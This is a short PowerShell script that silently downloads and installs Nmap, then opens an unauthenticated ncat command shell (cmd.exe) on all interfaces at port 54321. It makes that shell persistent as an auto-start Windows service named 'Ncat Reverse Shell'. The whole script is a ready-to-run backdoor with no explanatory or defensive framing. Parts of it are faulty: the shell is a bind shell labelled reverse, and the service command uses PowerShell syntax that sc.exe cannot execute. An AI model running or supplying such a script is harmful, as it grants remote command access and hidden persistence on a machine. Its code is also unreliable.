# Create temp directory if missing
if (!(Test-Path -Path "C:\temp")) {
    New-Item -Path "C:\temp" -ItemType Directory | Out-Null
}

# Download Nmap installer
$installerPath = "C:\temp\nmap-setup.exe"
Invoke-WebRequest "https://nmap.org/dist/nmap-7.95-setup.exe" -OutFile $installerPath

# Install Nmap silently
Start-Process $installerPath -ArgumentList "/S" -Wait

# Change to Nmap directory
Set-Location "C:\Program Files (x86)\Nmap"

# Start ncat immediately listener on port 54321
& "C:\Program Files (x86)\Nmap\ncat.exe" -nv 0.0.0.0 54321 -e cmd.exe

# Create Windows Service persistence
$serviceName = "Ncat Reverse Shell"
$serviceDisplay = "nc-reverse-shell"

# Command to be run
$serviceCmd = '& "C:\Program Files (x86)\Nmap\ncat.exe" -nv 0.0.0.0 54321 -e cmd.exe'

# Remove old service if present
if (Get-Service -Name $serviceName -ErrorAction SilentlyContinue) {
    sc.exe delete $serviceName | Out-Null
    Start-Sleep -Seconds 2
}

# Create new service
sc.exe create $serviceName binPath= "$serviceCmd" start= auto DisplayName= "`"$serviceDisplay`""

# Start service
Start-Service -Name $serviceName
